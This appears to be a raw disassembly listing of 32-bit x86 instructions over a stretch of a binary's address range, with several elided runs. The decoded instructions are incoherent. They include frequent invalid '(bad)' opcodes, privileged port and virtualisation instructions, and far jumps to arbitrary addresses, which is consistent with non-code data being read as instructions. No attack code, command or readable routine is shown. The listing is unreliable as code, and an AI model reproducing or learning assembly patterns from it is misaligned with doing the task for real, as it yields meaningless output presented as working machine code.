  41e3da:	xchg   edi,eax
  41e3db:	iret   
  41e3dc:	mov    ebp,edx
  41e3de:	add    ah,ch
  41e3e0:	xchg   edi,eax
  41e3e1:	mov    ecx,0xc0ef2666
  41e3e6:	call   0xe7c10a3a
  41e3eb:	into   
  41e3ec:	sbb    BYTE PTR cs:[edx*1+0x114450c],bh
  41e3f4:	mov    ah,0xf8
  41e3f6:	push   ss
  41e3f7:	(bad)  
  41e3f8:	not    DWORD PTR [edi-0x1]
  41e3fb:	loope  0x41e470
  41e3fd:	inc    ebx
  41e3fe:	sbb    eax,0x69acd4cd
  41e403:	jg     0x41e3d2
  41e405:	frstor [edi+0x4c2421dd]
  41e40b:	fcmove st,st(6)
  41e40d:	and    dl,BYTE PTR [edi-0x3404b419]
  41e413:	or     esp,0xffffff94
  41e416:	in     al,0x7f
  41e418:	test   al,0x72
  41e41a:	dec    eax
  41e41b:	inc    ebx
  41e41c:	or     eax,0x44bb4ece
  41e421:	popf   
  41e422:	or     ah,ah
  41e424:	and    eax,esp
  41e426:	fdivr  DWORD PTR [edi+0x4c]
  41e429:	aam    0xa5
  41e42b:	pop    edx
  41e42c:	xlat   BYTE PTR ds:[ebx]
  41e42d:	jmp    0xf7b66bfb
  41e432:	push   es
  41e433:	stos   BYTE PTR es:[edi],al
  41e434:	dec    edi
  41e435:	(bad)
  41e43a:	or     DWORD PTR [ebp-0x1e62dba8],ebp
  41e440:	iret   
  41e441:	jbe    0x41e3d7
  41e443:	ss push ss
  41e445:	adc    al,0xfa
  41e447:	xor    eax,0xa642a0e6
  41e44c:	movq   mm3,mm5
  41e44f:	sbb    bl,BYTE PTR [eax+ecx*4+0x61]
  41e453:	js     0x41e446
  41e455:	rol    ebp,0x1d
  41e458:	inc    edi
  41e459:	jmp    0x1162cd16
  41e45e:	cmp    ebx,ebp
  41e460:	icebp  
  41e461:	(bad)  
  41e462:	sti    
  41e463:	mov    DWORD PTR [esi-0x3ad87f84],eax
  41e469:	push   ss
  41e46a:	lahf   
  41e46b:	or     DWORD PTR [edi-0x25],edx
  41e46e:	mov    al,0xc1
  41e470:	push   ds
  41e471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e472:	lahf   
  41e473:	mov    cl,0x8e
  41e475:	push   edx
  41e476:	(bad)  
  41e477:	outs   dx,DWORD PTR ds:[esi]
  41e478:	call   0x47abb03
  41e47d:	aad    0x70
  41e47f:	jne    0x41e410
  41e481:	arpl   WORD PTR [ebx],ax
  41e483:	lods   eax,DWORD PTR ds:[esi]
  41e484:	xlat   BYTE PTR ds:[ebx]
  41e485:	out    dx,al
  41e486:	test   al,0xf8
  41e488:	mov    eax,0x4db78810
  41e48d:	push   ds
  41e48e:	vmwrite ebx,DWORD PTR [edi]
  41e491:	xor    dh,BYTE PTR [ebp-0xc]
  41e494:	aaa    
  41e495:	push   edi
  41e496:	sub    al,0x0
  41e498:	mov    edx,0xc1d5e74e
  41e49d:	adc    ah,BYTE PTR [esi+0x3e]
  41e4a0:	fisttp WORD PTR [eax+0x26]
  41e4a3:	push   cs
  41e4a4:	or     edx,DWORD PTR [edi+0x247d23b2]
  41e4aa:	sbb    dh,BYTE PTR [ebx+0x2a]
  41e4ad:	and    ch,BYTE PTR [edx+0x35]
  41e4b0:	xor    ebx,DWORD PTR [ebx]
  41e4b2:	gs gs aaa 
	...
  41e515:	add    BYTE PTR [eax],ah
  41e517:	push   0xffffffcb
  41e519:	dec    ebx
  41e51a:	retf   
  41e51b:	jmp    0x41e4bd
  41e51d:	imul   ecx,DWORD PTR [edi+0x51],0xffffff9a
  41e521:	push   ss
  41e522:	mov    bh,cl
  41e524:	imul   edi,DWORD PTR [ebx+0x140f6],0x107
  41e52e:	int    0x32
  41e530:	imul   ecx,DWORD PTR [ebx-0xa],0x782218d5
  41e537:	mov    ebx,0xf0f1646b
  41e53c:	xor    al,ah
  41e53e:	sbb    BYTE PTR cs:[ecx],ah
  41e541:	call   0xa6a:0xc7b5267e
  41e548:	nop
  41e549:	fstp   TBYTE PTR [edx+0x1666e43f]
  41e54f:	rcr    BYTE PTR ds:0xb4da6b39,1
  41e555:	adc    al,0x55
  41e557:	cmp    ebp,DWORD PTR [edx]
  41e559:	mov    eax,0x9bf5c535
  41e55e:	mov    dh,0xf2
  41e560:	les    esi,FWORD PTR [ecx-0x77]
  41e563:	sub    al,0xe1
  41e565:	inc    ebp
  41e566:	push   esi
  41e567:	push   ecx
  41e568:	mov    al,ds:0x164303c8
  41e56d:	sbb    dh,bl
  41e56f:	or     BYTE PTR [edx+0x53],0x39
  41e573:	aad    0xa7
  41e575:	pop    eax
  41e576:	cdq    
  41e577:	aaa    
  41e578:	jnp    0x41e567
  41e57a:	jl     0x41e54b
  41e57c:	ins    DWORD PTR es:[edi],dx
  41e57d:	retf   0xac0d
  41e580:	and    ch,BYTE PTR [ebx]
  41e582:	adc    BYTE PTR [esi],ah
  41e584:	or     cl,dl
  41e586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e587:	inc    ebx
  41e588:	push   0xffffffa6
  41e58a:	fsubr  DWORD PTR ds:0x3f5cf636
  41e590:	xor    esi,DWORD PTR [ecx]
  41e592:	pushw  0xffb6
  41e595:	loop   0x41e54a
  41e597:	aas    
  41e598:	ss fwait
  41e59a:	retf   0xa989
  41e59d:	jl     0x41e5c5
  41e59f:	leave  
  41e5a0:	in     eax,0x45
  41e5a2:	test   eax,0x31d1cfdd
  41e5a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5a8:	je     0x41e60c
  41e5aa:	mov    edx,0xb648ad10
  41e5af:	sbb    DWORD PTR [esi+0x5e73283f],ebp
  41e5b5:	adc    ebp,esi
  41e5b7:	mov    ds:0x9e1db041,eax
  41e5bc:	scas   al,BYTE PTR es:[edi]
  41e5bd:	sbb    al,0x12
  41e5bf:	push   ebx
  41e5c0:	mov    dl,0x4d
  41e5c2:	(bad)  
  41e5c3:	mov    edx,0x2b4000a6
  41e5c8:	push   ds
  41e5c9:	and    edx,esp
  41e5cb:	mov    cl,0x84
  41e5cd:	out    dx,al
  41e5ce:	mov    eax,ds:0x55d6344e
  41e5d3:	xchg   ebx,eax
  41e5d4:	push   edx
  41e5d5:	mov    edi,0xd10d7cda
  41e5da:	pusha  
  41e5db:	imul   eax
  41e5dd:	shl    DWORD PTR [esi],0x85
  41e5e0:	xchg   edi,eax
  41e5e2:	jns    0x41e640
  41e5e4:	mov    ds:0xac3936aa,eax
  41e5e9:	and    ecx,DWORD PTR [edx]
  41e5eb:	in     al,dx
  41e5ec:	push   ecx
  41e5ed:	call   0x5e36d110
  41e5f2:	xchg   esp,eax
  41e5f3:	mov    ah,0xf7
  41e5f5:	cmp    DWORD PTR [esi],esp
  41e5f7:	rcl    BYTE PTR [edi-0x348692e1],1
  41e5fd:	(bad)  
  41e5fe:	jl     0x41e613
  41e600:	aaa    
  41e601:	sub    ebx,DWORD PTR [ebp+0xa]
  41e604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e605:	xchg   DWORD PTR [ecx-0x1f],esp
  41e608:	adc    DWORD PTR [ebp-0x6932574f],edx
  41e60e:	pop    ebx
  41e60f:	test   BYTE PTR [ebx-0xd],ch
  41e612:	lock hlt 
  41e614:	pop    ebp
  41e615:	push   edx
  41e616:	cld    
  41e617:	or     DWORD PTR [eax-0x3],esp
  41e61a:	stos   DWORD PTR es:[edi],eax
  41e61b:	loop   0x41e5fa
  41e61d:	cmc    
  41e61e:	outs   dx,DWORD PTR ds:[esi]
  41e61f:	or     eax,0x15cd2c1c
  41e624:	(bad)  
  41e625:	fcomp  st(7)
  41e627:	sub    al,0xc5
  41e629:	add    esi,ebp
  41e62b:	lods   eax,DWORD PTR ds:[esi]
  41e62c:	push   0xffffffc8
  41e62e:	(bad)  
  41e62f:	ins    DWORD PTR es:[edi],dx
  41e630:	sub    al,0x50
  41e632:	test   DWORD PTR [edx+ebx*1+0x0],0x0
	...
  41e695:	add    ch,al
  41e697:	cwde   
  41e698:	loope  0x41e6ef
  41e69a:	std    
  41e69b:	jge    0x41e692
  41e69d:	cwde   
  41e69e:	xchg   edx,eax
  41e69f:	fmul   st(5),st
  41e6a1:	mov    ds:0x4755ec43,al
  41e6a6:	std    
  41e6a7:	inc    ecx
  41e6a8:	add    DWORD PTR [eax],eax
  41e6aa:	pop    es
  41e6ab:	add    DWORD PTR [eax],eax
  41e6ad:	add    BYTE PTR [ebx-0x6d],al
  41e6b0:	les    ebp,FWORD PTR [esi]
  41e6b2:	push   edi
  41e6b3:	mov    esp,0xaf6b13bb
  41e6b8:	or     eax,0xdc646bc0
  41e6bd:	aad    0xd7
  41e6bf:	dec    esp
  41e6c0:	mov    cl,0x85
  41e6c2:	mul    DWORD PTR [edx+0x77]
  41e6c5:	cs cld 
  41e6c7:	mov    esp,gs
  41e6c9:	and    bl,BYTE PTR [esp+esi*4+0x1d]
  41e6cd:	test   BYTE PTR ds:0x9ea67127,dl
  41e6d3:	dec    ebx
  41e6d4:	push   0xabc0fd0c
  41e6d9:	iret   
  41e6da:	loope  0x41e738
  41e6dc:	pop    edx
  41e6dd:	mov    esi,0x11a57d4f
  41e6e2:	jne    0x41e6b4
  41e6e4:	cmp    edx,0x51c3b966
  41e6ea:	(bad)  
  41e6eb:	ja     0x41e744
  41e6ed:	loopne 0x41e735
  41e6ef:	or     al,0x2e
  41e6f1:	out    0xed,al
  41e6f3:	sub    BYTE PTR [ebx],al
  41e6f5:	or     BYTE PTR [esi+ecx*1+0x3ada0a6e],0xca
  41e6fd:	and    eax,DWORD PTR [esi]
  41e6ff:	dec    esi
  41e700:	loop   0x41e746
  41e702:	fs in  al,dx
  41e704:	lods   eax,DWORD PTR ds:[esi]
  41e705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e706:	gs xchg edx,edx
  41e709:	mov    dl,0x44
  41e70b:	and    eax,0x172cd8b1
  41e710:	or     DWORD PTR [ecx+esi*8-0x263473b0],0x31
  41e718:	xchg   ecx,eax
  41e719:	cwde   
  41e71a:	sti    
  41e71b:	xor    ch,BYTE PTR ds:0x9e56b0a0
  41e721:	std    
  41e722:	jecxz  0x41e73f
  41e724:	or     DWORD PTR [ebp+0x28],0x6bc268a1
  41e72b:	les    esp,FWORD PTR [ebx]
  41e72d:	out    0x3c,al
  41e72f:	ja     0x41e762
  41e731:	das    
  41e732:	(bad)  
  41e733:	aas    
  41e734:	pop    esp
  41e735:	and    BYTE PTR [esi],ch
  41e737:	inc    BYTE PTR [edx]
  41e739:	test   DWORD PTR [ecx-0x6bdf056],edi
  41e73f:	or     edx,eax
  41e741:	aad    0x36
  41e743:	aad    0x23
  41e745:	enter  0xf63,0x77
  41e749:	addr16 jmp 0x41e7c6
  41e74c:	ret    0xc637
  41e74f:	xor    ah,bl
  41e751:	test   eax,0x1c1ef797
  41e756:	mov    ah,0xff
  41e758:	adc    ah,BYTE PTR [esp+edi*2+0x52]
  41e75c:	xchg   ecx,eax
  41e75d:	dec    ebx
  41e75e:	enter  0x3f04,0x78
  41e762:	pop    es
  41e763:	dec    ebp
  41e764:	out    0xe6,eax
  41e766:	inc    DWORD PTR [eax+ebx*1+0x4c9760fa]
  41e76d:	sub    DWORD PTR [edi-0x26],ebx
  41e770:	jl     0x41e781
  41e772:	sti    
  41e773:	sar    BYTE PTR ds:0xdfd1d6e4,1
  41e779:	mov    eax,ds:0x6a68df18
  41e77e:	retf   
  41e77f:	adc    esi,ebx
  41e781:	add    edi,eax
  41e783:	into   
  41e784:	xlat   BYTE PTR ds:[ebx]
  41e785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e786:	arpl   si,bx
  41e788:	or     ecx,DWORD PTR [ebp-0x3de34934]
  41e78e:	push   ecx
  41e78f:	daa    
  41e790:	sbb    esp,DWORD PTR [eax+edi*4-0x24]
  41e794:	lock mov ds,ecx
  41e797:	cdq    
  41e798:	test   BYTE PTR [esi-0x5],bh
  41e79b:	mov    dl,0xa3
  41e79d:	stc    
  41e79e:	adc    eax,0x4757c1d5
  41e7a3:	xlat   BYTE PTR ds:[ebx]
  41e7a4:	pop    eax
  41e7a5:	pop    eax
  41e7a6:	xchg   ebx,eax
  41e7a7:	mov    ebx,0x21f465aa
  41e7ac:	test   DWORD PTR [edi],esi
  41e7ae:	std    
  41e7af:	fs sbb al,0x1e
  41e7b2:	inc    edi
  41e7b3:	sahf   
  41e7b4:	and    eax,DWORD PTR [eax]
	...
  41e816:	sub    eax,0x9e5c8a39
  41e81b:	(bad)  
  41e81c:	(bad)  
  41e81d:	jns    0x41e875
  41e81f:	imul   ebx,DWORD PTR [esi+eiz*2],0xffffffb4
  41e823:	xchg   edi,eax
  41e824:	rol    BYTE PTR [edi],1
  41e826:	add    al,0x43
  41e828:	add    DWORD PTR [eax],eax
  41e82a:	pop    es
  41e82b:	add    DWORD PTR [eax],eax
  41e82d:	add    bl,ah
  41e82f:	mov    DWORD PTR [eax-0x37],edx
  41e832:	(bad)  [ecx-0x1c]
  41e835:	xchg   ebp,eax
  41e836:	mov    dl,ch
  41e838:	lods   al,BYTE PTR ds:[esi]
  41e839:	xor    BYTE PTR [edx],bh
  41e83b:	mov    cl,0x6c
  41e83d:	pushf  
  41e83e:	stos   DWORD PTR es:[edi],eax
  41e83f:	sbb    esp,ebp
  41e841:	fild   DWORD PTR [ebp-0x2c]
  41e844:	lea    ebp,[edi]
  41e846:	cmc    
  41e847:	pop    ebx
  41e848:	in     al,0xd2
  41e84a:	scas   al,BYTE PTR es:[edi]
  41e84b:	mov    bl,0x70
  41e84d:	scas   eax,DWORD PTR es:[edi]
  41e84e:	popf   
  41e84f:	mov    bh,0xac
  41e851:	xor    ecx,ebp
  41e853:	jno    0x41e839
  41e855:	lds    edi,FWORD PTR [edi+0x22]
  41e858:	pop    ebp
  41e859:	(bad)  
  41e85a:	cmp    DWORD PTR [ebp+0xebf9a0e],esp
  41e860:	mov    ss,eax
  41e862:	lea    edi,[edi-0x1892e55c]
  41e868:	scas   eax,DWORD PTR es:[edi]
  41e869:	aam    0x4b
  41e86b:	jne    0x41e869
  41e86d:	mov    ds:0x19086902,eax
  41e872:	(bad)  
  41e874:	enter  0xc023,0x25
  41e878:	aad    0x89
  41e87a:	inc    edx
  41e87b:	std    
  41e87c:	and    al,0x84
  41e87f:	inc    ebp
  41e880:	repnz mov al,BYTE PTR [ebp+0x7f]
  41e884:	jno    0x41e848
  41e886:	lods   al,BYTE PTR ds:[esi]
  41e887:	(bad)  
  41e888:	fadd   DWORD PTR [ebp+0x10fb12c8]
  41e88e:	arpl   si,cx
  41e890:	jle    0x41e898
  41e892:	int3   
  41e893:	ins    DWORD PTR es:[edi],dx
  41e894:	dec    esi
  41e895:	jns    0x41e90d
  41e897:	xchg   edi,eax
  41e898:	add    ecx,DWORD PTR [esp+eax*1-0x3e]
  41e89c:	jl     0x41e891
  41e89e:	mov    esp,0xd78c541e
  41e8a3:	jle    0x41e8f9
  41e8a5:	or     al,0x71
  41e8a7:	cmp    eax,0x1ba2ff19
  41e8ac:	jo     0x41e86b
  41e8ae:	loope  0x41e89a
  41e8b0:	ins    BYTE PTR es:[edi],dx
  41e8b1:	sbb    BYTE PTR [esi+0xd],dl
  41e8b4:	pop    ecx
  41e8b5:	call   0xafd0:0xbac66823
  41e8bc:	sbb    BYTE PTR [ebp+0x474c809b],al
  41e8c2:	cs ror cl,0x26
  41e8c6:	in     al,dx
  41e8c7:	inc    ebp
  41e8c8:	scas   eax,DWORD PTR es:[edi]
  41e8c9:	fistp  QWORD PTR [edi]
  41e8cb:	ror    DWORD PTR [eax],1
  41e8cd:	mov    ds:0x9dc62031,eax
  41e8d2:	adc    eax,0xf7a0234d
  41e8d7:	jnp    0x41e94e
  41e8d9:	sbb    esi,DWORD PTR [ebp-0x2f]
  41e8dc:	shr    BYTE PTR [edx-0x11],cl
  41e8df:	add    BYTE PTR [ecx-0x80],bh
  41e8e2:	push   ebp
  41e8e3:	or     al,0xb5
  41e8e5:	dec    ecx
  41e8e6:	xlat   BYTE PTR ds:[ebx]
  41e8e7:	pop    eax
  41e8e8:	pop    ds
  41e8e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8ea:	or     al,0xc0
  41e8ec:	push   0x920c9894
  41e8f1:	add    DWORD PTR [ebx+0x37e74f22],ecx
  41e8f7:	(bad)  
  41e8f8:	imul   esp,DWORD PTR [edi+0x2a],0xffffffe1
  41e8fc:	and    al,0x9e
  41e8fe:	push   esp
  41e8ff:	add    eax,0xb006bddb
  41e904:	mov    ds:0xf6cb7517,al
  41e909:	daa    
  41e90a:	mov    eax,ds:0xb1f5e61
  41e90f:	popa   
  41e910:	imul   esi,edi,0xffffff89
  41e913:	push   ebx
  41e914:	out    0x21,al
  41e916:	sbb    BYTE PTR [ebx],0xc1
  41e919:	or     al,0xe0
  41e91b:	pop    ss
  41e91c:	sti    
  41e91d:	push   ecx
  41e91e:	xchg   ebx,eax
  41e91f:	dec    ecx
  41e920:	pop    ecx
  41e921:	fbstp  TBYTE PTR ds:0x80a4a25d
  41e927:	nop
  41e928:	cmp    dl,dh
  41e92a:	sub    ebx,DWORD PTR [ebp-0x7d]
  41e92d:	(bad)  
  41e92e:	jmp    FWORD PTR [esi+0x754400bd]
  41e934:	mov    bl,0x0
	...
  41e996:	js     0x41e995
  41e998:	ret    0xc766
  41e99b:	jg     0x41e999
  41e99d:	(bad)  
  41e99e:	jmp    0x41e94c
  41e9a0:	repnz xchg ecx,eax
  41e9a2:	arpl   WORD PTR [ebx+0x440bf635],dx
  41e9a8:	add    DWORD PTR [eax],eax
  41e9aa:	pop    es
  41e9ab:	add    DWORD PTR [eax],eax
  41e9ad:	add    BYTE PTR [ebx],ah
  41e9af:	test   BYTE PTR [edi+ebx*8],al
  41e9b2:	imul   ebp,eax,0x57c4b126
  41e9b8:	inc    esp
  41e9b9:	sub    BYTE PTR ds:0x36e18167,dl
  41e9bf:	daa    
  41e9c0:	mov    ch,0x4a
  41e9c2:	adc    BYTE PTR ds:0x83e22b46,bh
  41e9c8:	loope  0x41ea25
  41e9ca:	es nop
  41e9cc:	cmp    BYTE PTR [ecx+0x3c568eba],dl
  41e9d2:	lds    ebp,FWORD PTR [esi-0x95f2df6]
  41e9d8:	push   ss
  41e9d9:	pop    ecx
  41e9da:	ret    0xf641
  41e9dd:	(bad)  
  41e9de:	shr    DWORD PTR [edx],cl
  41e9e0:	repnz dec edi
  41e9e2:	and    eax,0x43156a24
  41e9e7:	test   DWORD PTR [ecx+0x69],0x123f4bd6
  41e9ee:	jo     0x41e979
  41e9f0:	mov    esp,0x84eddcb5
  41e9f5:	and    esp,ebx
  41e9f7:	inc    ecx
  41e9f8:	hlt    
  41e9f9:	fcmove st,st(6)
  41e9fb:	das    
  41e9fc:	xchg   ecx,eax
  41e9fd:	sbb    dh,ch
  41e9ff:	js     0x41ea60
  41ea01:	jns    0x41e9ec
  41ea03:	jle    0x41ea3a
  41ea05:	cmp    dl,BYTE PTR [edi+ebp*8+0x32]
  41ea09:	xchg   ecx,eax
  41ea0a:	or     edx,ebx
  41ea0c:	hlt    
  41ea0d:	lods   eax,DWORD PTR ds:[esi]
  41ea0e:	or     eax,0xc5de0948
  41ea13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea14:	rol    dh,1
  41ea16:	push   es
  41ea17:	cli    
  41ea18:	fdivrp st(7),st
  41ea1a:	jle    0x41ea0e
  41ea1c:	cmp    DWORD PTR [edi-0x58],eax
  41ea1f:	sbb    eax,0x51b107df
  41ea24:	fstp   QWORD PTR [eax+0x4e0de6a0]
  41ea2a:	cli    
  41ea2b:	ret    
  41ea2c:	scas   eax,DWORD PTR es:[edi]
  41ea2d:	out    0xfd,eax
  41ea2f:	or     al,0x53
  41ea31:	popa   
  41ea32:	jg     0x41eaac
  41ea34:	cdq    
  41ea35:	cs inc ecx
  41ea37:	mov    eax,ds:0x5e61e1c
  41ea3c:	(bad)  
  41ea3d:	sahf   
  41ea3e:	shl    bh,cl
  41ea40:	fadd   QWORD PTR [eax+0x69]
  41ea43:	dec    ecx
  41ea44:	in     eax,0xae
  41ea46:	dec    esp
  41ea47:	inc    edx
  41ea48:	pop    edi
  41ea49:	call   FWORD PTR [edx-0x5f8995e6]
  41ea4f:	ret    0xfe62
  41ea52:	push   0x2f0c09d9
  41ea57:	pop    eax
  41ea58:	push   cs
  41ea59:	mov    ebx,0x683d9a77
  41ea5e:	xchg   ecx,eax
  41ea5f:	loopne 0x41e9ea
  41ea61:	or     bl,al
  41ea63:	mov    dl,0xe1
  41ea65:	pop    ecx
  41ea66:	cmp    bh,al
  41ea68:	cs dec eax
  41ea6a:	xor    al,0x57
  41ea6c:	lds    ecx,FWORD PTR [ecx]
  41ea6e:	cmp    edx,esp
  41ea70:	pop    ebx
  41ea71:	xor    edi,eax
  41ea73:	stos   DWORD PTR es:[edi],eax
  41ea74:	out    dx,eax
  41ea75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea76:	ss mov dh,0xf1
  41ea79:	add    ch,BYTE PTR [edi]
  41ea7b:	pop    ds
  41ea7c:	dec    ecx
  41ea7d:	inc    ebp
  41ea7e:	mov    bl,0x69
  41ea80:	inc    ebp
  41ea81:	mov    esp,0x9586c044
  41ea86:	push   esi
  41ea87:	xchg   ebp,eax
  41ea88:	pop    ecx
  41ea89:	mov    eax,ds:0xd8942610
  41ea8e:	aad    0x5b
  41ea90:	push   ss
  41ea91:	jge    0x41eaaa
  41ea93:	add    eax,DWORD PTR [ecx-0x4f]
  41ea96:	inc    ebx
  41ea97:	ins    DWORD PTR es:[edi],dx
  41ea98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea99:	cmp    BYTE PTR [ebx],cl
  41ea9b:	jmp    0x234529c5
  41eaa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaa1:	lock mov al,0x85
  41eaa4:	pop    eax
  41eaa5:	inc    edx
  41eaa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaa7:	imul   eax,ebx,0x83275e3f
  41eaad:	push   edx
  41eaae:	and    eax,0xd289937c
  41eab3:	in     eax,0x69
	...
  41eb15:	add    BYTE PTR [edx],dl
  41eb17:	das    
  41eb18:	mov    esi,DWORD PTR [edi+edi*4+0x22af3fb4]
  41eb1f:	and    ebp,DWORD PTR [eax]
  41eb21:	fst    DWORD PTR [eax]
  41eb23:	stc    
  41eb24:	inc    eax
  41eb25:	mov    WORD PTR [edx],ss
  41eb27:	inc    ebp
  41eb28:	add    DWORD PTR [eax],eax
  41eb2a:	pop    es
  41eb2b:	add    DWORD PTR [eax],eax
  41eb2d:	add    al,cl
  41eb2f:	in     al,0x67
  41eb31:	mov    bh,0xcb
  41eb33:	sbb    al,dl
  41eb35:	in     eax,dx
  41eb36:	imul   esp,DWORD PTR [eax+0x1e4564ba],0xffffffd8
  41eb3d:	fimul  DWORD PTR [ecx-0x27]
  41eb40:	sbb    esi,ebx
  41eb42:	stos   DWORD PTR es:[edi],eax
  41eb43:	add    al,0x95
  41eb45:	pop    ebx
  41eb46:	jmp    0x41eaf8
  41eb48:	shl    DWORD PTR [edi*1-0x77a79808],0xcc
  41eb50:	dec    esi
  41eb51:	data16 out dx,al
  41eb53:	or     DWORD PTR [ecx-0x5f],edi
  41eb56:	add    eax,0x21043a04
  41eb5b:	inc    edi
  41eb5c:	out    0xa9,al
  41eb5e:	mov    edx,0xb4d1dad9
  41eb63:	mov    ?,WORD PTR [ebp-0x21]
  41eb66:	pop    ss
  41eb67:	jno    0x41eb13
  41eb69:	inc    eax
  41eb6a:	jmp    ecx
  41eb6c:	gs mov ebp,0xabf5d7da
  41eb72:	arpl   bx,cx
  41eb74:	jo     0x41eb82
  41eb76:	out    0xed,eax
  41eb78:	shr    BYTE PTR [bx+di],cl
  41eb7b:	stos   DWORD PTR es:[edi],eax
  41eb7c:	cmc    
  41eb7d:	fcom   DWORD PTR [edi+0x18]
  41eb80:	or     eax,0x9cfafd08
  41eb85:	dec    ebx
  41eb86:	popf   
  41eb87:	push   0xa78ab6ab
  41eb8c:	xor    DWORD PTR [eax],ecx
  41eb8e:	jmp    0x8277:0x653179f7
  41eb95:	or     cl,BYTE PTR [eax-0x12]
  41eb98:	push   ebx
  41eb99:	std    
  41eb9a:	(bad)  
  41eb9c:	idiv   BYTE PTR [edx+0x23]
  41eb9f:	xor    eax,0x826e9895
  41eba4:	ds and eax,0x6eaa553f
  41ebaa:	imul   esi,DWORD PTR [eax-0x121ef8e7],0xb74c5173
  41ebb4:	cmp    BYTE PTR [eiz*1+0x63f27d04],al
  41ebbb:	mov    ebx,0x7a007327
  41ebc0:	outs   dx,BYTE PTR ds:[esi]
  41ebc1:	jle    0x41eb67
  41ebc3:	shl    ebp,0x56
  41ebc6:	mov    WORD PTR [edx],gs
  41ebc8:	mov    ah,0xe8
  41ebca:	add    al,BYTE PTR [ecx-0x45b10a3a]
  41ebd0:	retw   
  41ebd2:	sahf   
  41ebd3:	pop    ss
  41ebd4:	jne    0x41eb5f
  41ebd6:	sub    ebx,DWORD PTR [esi+0x1d]
  41ebd9:	(bad)  
  41ebda:	pop    ebp
  41ebdb:	test   eax,0x1c1c4d57
  41ebe0:	sub    DWORD PTR [edx],ecx
  41ebe2:	mov    edi,0xe9c122d5
  41ebe7:	xchg   ebp,eax
  41ebe8:	imul   ebp,DWORD PTR [ebp+0x4ddf0ccc],0x23
  41ebef:	adc    ebx,DWORD PTR [ebx]
  41ebf1:	fiadd  DWORD PTR [edi]
  41ebf3:	xchg   edx,eax
  41ebf4:	push   0xffffffff
  41ebf6:	adc    BYTE PTR ss:[eax-0x231a1bec],al
  41ebfd:	out    0x5d,al
  41ebff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec00:	test   BYTE PTR [edx-0x51b2cfe4],bl
  41ec06:	pop    esi
  41ec07:	mov    esp,DWORD PTR [esi+0x75018dea]
  41ec0d:	inc    esi
  41ec0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec0f:	sub    bh,0x89
  41ec12:	les    ebp,FWORD PTR [edi]
  41ec14:	lods   eax,DWORD PTR ds:[esi]
  41ec15:	inc    ebp
  41ec16:	xchg   esp,eax
  41ec17:	dec    edx
  41ec18:	into   
  41ec19:	in     eax,dx
  41ec1a:	xor    al,0xc2
  41ec1c:	xchg   esi,eax
  41ec1d:	adc    eax,0xc48cd856
  41ec22:	mov    al,ds:0x9cea2ed9
  41ec27:	and    al,0x73
  41ec29:	xchg   ebx,eax
  41ec2a:	or     ebp,ecx
  41ec2c:	mov    edi,0xd3becb88
  41ec31:	and    BYTE PTR [edx-0x77],0xb5
	...
  41ec95:	add    BYTE PTR [ecx-0xf],al
  41ec98:	(bad)
  41ec9b:	hlt    
  41ec9c:	gs icebp 
  41ec9e:	adc    ebx,edi
  41eca0:	ficom  WORD PTR [ecx]
  41eca2:	fadd   DWORD PTR [edx+0x46190784]
  41eca8:	add    DWORD PTR [eax],eax
  41ecaa:	pop    es
  41ecab:	add    DWORD PTR [eax],eax
  41ecad:	add    BYTE PTR [esi+ebx*8-0x3],ch
  41ecb1:	mov    ebx,DWORD PTR [ecx]
  41ecb3:	je     0x41eca9
  41ecb5:	test   al,0x9b
  41ecb7:	cmp    al,0x5
  41ecb9:	repz mov ch,0xfc
  41ecbc:	imul   esi,DWORD PTR [ebp-0x5d],0xffffff93
  41ecc0:	adc    BYTE PTR [ebx-0x217f400c],bl
  41ecc6:	add    ecx,edi
  41ecc8:	jg     0x41ec5f
  41ecca:	and    ch,0x55
  41eccd:	sub    esi,eax
  41eccf:	mov    ebp,0xa1454167
  41ecd4:	in     eax,dx
  41ecd5:	xchg   ebp,eax
  41ecd6:	pop    edi
  41ecd7:	adc    BYTE PTR [ebp-0x8],0xeb
  41ecdb:	sbb    BYTE PTR [ecx+0x3a87508a],cl
  41ece1:	cmp    al,0xc5
  41ece3:	jecxz  0x41ec91
  41ece5:	mov    esp,0xa114749a
  41ecea:	sbb    BYTE PTR [ecx+0xc],ch
  41eced:	mov    cl,bh
  41ecef:	or     BYTE PTR [edi],ah
  41ecf1:	call   0xc047d351
  41ecf6:	xlat   BYTE PTR ds:[ebx]
  41ecf7:	or     ah,BYTE PTR ds:0x281baa41
  41ecfd:	jo     0x41eccc
  41ecff:	or     DWORD PTR [eax-0x308d0ccc],edx
  41ed05:	inc    ebp
  41ed06:	mov    DWORD PTR [edi-0x36],0xa7088998
  41ed0d:	clc    
  41ed0e:	mov    ebp,0x85302031
  41ed13:	repnz scas al,BYTE PTR es:[edi]
  41ed15:	and    al,0xb8
  41ed17:	or     esi,ebp
  41ed19:	imul   ebx,DWORD PTR [ebx],0x9e2c717d
  41ed1f:	sub    DWORD PTR [ebx+0x1390ce7c],eax
  41ed25:	into   
  41ed26:	mov    ebp,0x4bb638e4
  41ed2b:	xchg   ebp,eax
  41ed2c:	arpl   WORD PTR [edx+0x6abb4bc],ax
  41ed32:	std    
  41ed33:	or     edx,DWORD PTR [ebx-0x4e]
  41ed36:	mov    al,ds:0x312f4865
  41ed3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed3c:	clc    
  41ed3d:	or     bl,BYTE PTR [ecx]
  41ed3f:	popa   
  41ed40:	mov    dl,0x93
  41ed42:	inc    esi
  41ed43:	test   BYTE PTR [eax-0x8949bd6],dl
  41ed49:	mov    ds:0x1001b608,al
  41ed4e:	ins    BYTE PTR es:[edi],dx
  41ed4f:	or     eax,0x581fc0b2
  41ed54:	mov    al,ds:0x59608b23
  41ed59:	sub    edx,esp
